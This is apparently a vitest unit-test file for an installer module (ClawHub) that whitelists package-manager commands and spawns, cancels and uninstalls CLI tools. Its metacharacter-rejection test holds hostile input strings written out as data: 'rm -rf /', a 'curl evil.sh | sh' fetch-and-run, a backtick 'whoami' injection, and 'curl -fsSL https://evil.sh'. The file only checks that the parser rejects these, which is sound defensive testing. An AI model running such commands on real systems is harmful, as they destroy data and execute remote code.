/**
 * claw-installer.test.ts — 安装执行器单测（ClawHub T02，vitest / node 环境）
 *
 * 覆盖：
 *  - parseInstallCommand 白名单解析（合法 / 中文文案 / 元字符 / 裸 pm）
 *  - startInstall 错误分支（404 未知 id · 422 copy-only）
 *  - 真实 spawn（node 白名单注入）SSE 事件序 install-start → log* → done
 *  - 失败路径 exit ≠0 → install-error INSTALL_FAILED + stderr_tail
 *  - cancel → INSTALL_CANCELED 且子进程终止
 */
import { afterAll, describe, expect, it } from 'vitest';
import {
  InstallError,
  __resetInstallerForTest,
  __testInjectPm,
  cancelInstall,
  getInstall,
  parseInstallCommand,
  startInstall,
  startUninstall,
  type InstallSession,
} from '../lib/claw-installer';
import { KNOWN_CLIS, findCli } from '../cli-registry';

afterAll(() => {
  __resetInstallerForTest();
});

describe('parseInstallCommand — 白名单解析', () => {
  it('npm 命令解析为 {pm, args}', () => {
    expect(parseInstallCommand('npm i -g @anthropic-ai/claude-cli')).toEqual({
      pm: 'npm',
      args: ['i', '-g', '@anthropic-ai/claude-cli'],
    });
  });

  it('pip 命令解析（容忍首尾空白）', () => {
    expect(parseInstallCommand('  pip install autoresearchclaw ')).toEqual({
      pm: 'pip',
      args: ['install', 'autoresearchclaw'],
    });
  });

  it('中文文案（hermes）返回 null = copy-only', () => {
    expect(parseInstallCommand('参见 hermes 官方文档')).toBeNull();
  });

  it('「从 cursor.com 下载」返回 null', () => {
    expect(parseInstallCommand('从 cursor.com 下载')).toBeNull();
  });

  it('shell 元字符拒绝', () => {
    expect(parseInstallCommand('npm i; rm -rf /')).toBeNull();
    expect(parseInstallCommand('npm i && curl evil.sh | sh')).toBeNull();
    expect(parseInstallCommand('npm i `whoami`')).toBeNull();
  });

  it('裸 pm（无参数）拒绝', () => {
    expect(parseInstallCommand('npm')).toBeNull();
  });

  it('非白名单首 token 拒绝', () => {
    expect(parseInstallCommand('curl -fsSL https://evil.sh')).toBeNull();
  });

  it('空串安全', () => {
    expect(parseInstallCommand('')).toBeNull();
  });
});

describe('registry — AutoResearchClaw 注册项（2026-10-30 校准后）', () => {
  it('autoresearchclaw 条目存在：researchclaw 二进制 + --topic argv 模式', () => {
    const arc = findCli('autoresearchclaw');
    expect(arc).toBeDefined();
    expect(arc?.is_claw).toBe(true);
    expect(arc?.binary).toBe('researchclaw');
    expect(arc?.install_cmd).toContain('git clone');
    expect(arc?.stream_format).toBe('plain-line');
    expect(arc?.prompt_mode).toBe('argv---topic');
    expect(arc?.uninstall_cmd).toBeDefined(); // git-clone 型 → 手动卸载引导
    expect(arc?.uninstall_spec).toBeUndefined(); // 不可自动卸载
    expect(arc?.category).toBe('research');
  });

  it('既有 claw 条目零破坏 —— openclaw/hermes 补展示字段', () => {
    const openclaw = findCli('openclaw');
    expect(openclaw?.is_claw).toBe(true);
    expect(openclaw?.binary).toBe('openclaw');
    expect(openclaw?.install_cmd).toBe('npm i -g openclaw');
    const hermes = findCli('hermes');
    expect(hermes?.is_claw).toBe(true);
    // claude 未标记 is_claw（默认 CLI，不是 Claw 门面对象）
    expect(findCli('claude')?.is_claw).toBeUndefined();
  });

  it('并发安装同一 CLI → 409', async () => {
    __resetInstallerForTest();
    // 用 node 注入的长命会话占住 autoresearchclaw
    const first = spawnManual(['node', '-e', 'setTimeout(() => {}, 60000)']);
    expect(first.status === 'pending' || first.status === 'running').toBe(true);
    try {
      startInstall('autoresearchclaw');
      throw new Error('should have thrown 409');
    } catch (err) {
      expect(err).toBeInstanceOf(InstallError);
      expect((err as InstallError).status).toBe(409);
      expect((err as InstallError).code).toBe('INSTALL_IN_PROGRESS');
    } finally {
      cancelInstall(first.install_id);
      await first.finished;
    }
  });
});

describe('startInstall — 错误分支', () => {
  it('未知 cliId → 404 CLI_NOT_FOUND', () => {
    try {
      startInstall('no-such-cli');
      throw new Error('should have thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(InstallError);
      expect((err as InstallError).status).toBe(404);
      expect((err as InstallError).code).toBe('CLI_NOT_FOUND');
    }
  });

  it('copy-only（hermes）→ 422 INSTALL_NOT_EXECUTABLE', () => {
    try {
      startInstall('hermes');
      throw new Error('should have thrown');
    } catch (err) {
      expect((err as InstallError).status).toBe(422);
      expect((err as InstallError).code).toBe('INSTALL_NOT_EXECUTABLE');
    }
  });
});

describe('startInstall — 真实 spawn（node 注入白名单）', () => {
  it(
    '成功路径：install-start → install-log* → install-done',
    async () => {
      __resetInstallerForTest();
      const session = spawnManual([
        'node',
        '-e',
        'console.log("line-1"); console.log("line-2");',
      ]);
      await session.finished;
      expect(session.status).toBe('done');
      const events = session.events.map((e) => e.event);
      expect(events[0]).toBe('install-start');
      expect(events[events.length - 1]).toBe('install-done');
      const done = session.events[session.events.length - 1].data;
      expect(done.exit_code).toBe(0);
      expect(done.duration_ms).toBeGreaterThanOrEqual(0);
      const logs = session.events.filter((e) => e.event === 'install-log');
      const lines = logs.map((e) => e.data.line);
      expect(lines).toContain('line-1');
      expect(lines).toContain('line-2');
      expect(logs.every((e) => e.data.stream === 'stdout')).toBe(true);
    },
    30_000,
  );

  it(
    '失败路径：exit ≠0 → install-error INSTALL_FAILED 带 stderr_tail',
    async () => {
      __resetInstallerForTest();
      const session = spawnManual(['node', '-e', 'console.error("boom"); process.exit(3)']);
      await session.finished;
      expect(session.status).toBe('error');
      const last = session.events[session.events.length - 1];
      expect(last.event).toBe('install-error');
      expect(last.data.code).toBe('INSTALL_FAILED');
      expect(last.data.exit_code).toBe(3);
      expect(String(last.data.stderr_tail)).toContain('boom');
    },
    30_000,
  );

  it(
    'cancel → INSTALL_CANCELED 且子进程被终止；幂等 + 未知 id false',
    async () => {
      __resetInstallerForTest();
      const session = spawnManual(['node', '-e', 'setTimeout(() => {}, 60000)']);
      await new Promise((r) => setTimeout(r, 400));
      expect(session.status).toBe('running');
      const ok = cancelInstall(session.install_id);
      expect(ok).toBe(true);
      await session.finished;
      expect(['canceled', 'error']).toContain(session.status);
      const errFrame = session.events.find(
        (e) => e.event === 'install-error' && e.data.code === 'INSTALL_CANCELED',
      );
      expect(errFrame).toBeDefined();
      expect(cancelInstall(session.install_id)).toBe(true);
      expect(cancelInstall('inst-does-not-exist')).toBe(false);
    },
    30_000,
  );
});

describe('getInstall — 会话查找', () => {
  it('未知 id 返回 undefined', () => {
    expect(getInstall('inst-none')).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

/**
 * 以 node 为 pm 构造安装会话（测试专用）：
 *  1. PM_WHITELIST 临时 add('node')
 *  2. 临时改写 registry 里 autoresearchclaw 的 install_spec 为 {pm:'node', args}
 *  3. startInstall → 返回会话（finally 恢复注册表 + 白名单）
 */
function spawnManual(argv: string[]): InstallSession {
  const restore = __testInjectPm('node');
  const arc = KNOWN_CLIS.find((c) => c.id === 'autoresearchclaw') as
    | { install_spec?: { pm: string; args: string[] }; install_cmd: string }
    | undefined;
  if (!arc) throw new Error('autoresearchclaw missing from registry');
  const originalSpec = arc.install_spec;
  const originalCmd = arc.install_cmd;
  arc.install_spec = { pm: 'node', args: argv.slice(1) };
  try {
    return startInstall('autoresearchclaw');
  } finally {
    arc.install_spec = originalSpec;
    arc.install_cmd = originalCmd;
    restore();
  }
}

// ---------------------------------------------------------------------------
// startUninstall — 卸载生命周期（2026-10-30）
// ---------------------------------------------------------------------------

describe('startUninstall — 卸载会话', () => {
  it('npm 系 CLI（kimi）→ 生成 uninstall 会话，argv/command 正确（不真跑 npm）', () => {
    // 只校验会话构造（argv/command/id 前缀），不 await finished —— 避免
    // 测试环境真执行 npm uninstall（污染全局 / pm 缺失假阴性）。
    const restore = __testInjectPm('definitely-not-a-real-pm');
    const kimi = KNOWN_CLIS.find((c) => c.id === 'kimi') as {
      uninstall_spec?: { pm: string; args: string[] };
    };
    if (!kimi) throw new Error('kimi missing from registry');
    const original = kimi.uninstall_spec;
    kimi.uninstall_spec = { pm: 'definitely-not-a-real-pm', args: ['uninstall', '-g', 'kimi-cli'] };
    try {
      const s = startUninstall('kimi');
      expect(s.install_id.startsWith('uninst-')).toBe(true);
      expect(s.cli_id).toBe('kimi');
      expect(s.argv).toEqual(['definitely-not-a-real-pm', 'uninstall', '-g', 'kimi-cli']);
      expect(s.command).toBe('definitely-not-a-real-pm uninstall -g kimi-cli');
      // 不等 finished：spawn 失败（pm 不存在）属预期，直接取消清理。
      cancelInstall(s.install_id);
    } finally {
      kimi.uninstall_spec = original;
      restore();
    }
  });

  it('copy-only CLI（cursor：无 uninstall_spec）→ 422 UNINSTALL_NOT_EXECUTABLE，message 含引导', () => {
    try {
      startUninstall('cursor');
      expect.unreachable('cursor 应抛 422');
    } catch (err) {
      expect(err).toBeInstanceOf(InstallError);
      const e = err as InstallError;
      expect(e.status).toBe(422);
      expect(e.code).toBe('UNINSTALL_NOT_EXECUTABLE');
      // 有 uninstall_cmd → “需手动卸载：<cmd>”；无 → “无自动卸载方式”。两者皆可。
      expect(e.message.length).toBeGreaterThan(0);
    }
  });

  it('未知 CLI → 404', () => {
    try {
      startUninstall('no-such-cli');
      expect.unreachable('应抛 404');
    } catch (err) {
      expect((err as InstallError).status).toBe(404);
    }
  });

  it('卸载会话可取消（幂等）', async () => {
    const s = spawnUninstallManual(['node', '-e', 'setTimeout(()=>{},10000)']);
    cancelInstall(s.install_id);
    expect(s.status).toBe('canceled');
    expect(cancelInstall(s.install_id)).toBe(true); // 幂等
    await s.finished;
    const last = s.events.at(-1);
    expect(last?.event).toBe('install-error');
    expect((last?.data as { code?: string }).code).toBe('INSTALL_CANCELED');
  });
});

/** 卸载版 spawnManual：临时把 ARC 的 uninstall_spec 指到 node。 */
function spawnUninstallManual(argv: string[]): InstallSession {
  const restore = __testInjectPm('node');
  const arc = KNOWN_CLIS.find((c) => c.id === 'autoresearchclaw') as
    | { uninstall_spec?: { pm: string; args: string[] } }
    | undefined;
  if (!arc) throw new Error('autoresearchclaw missing from registry');
  const original = arc.uninstall_spec;
  arc.uninstall_spec = { pm: 'node', args: argv.slice(1) };
  try {
    return startUninstall('autoresearchclaw');
  } finally {
    arc.uninstall_spec = original;
    restore();
  }
}
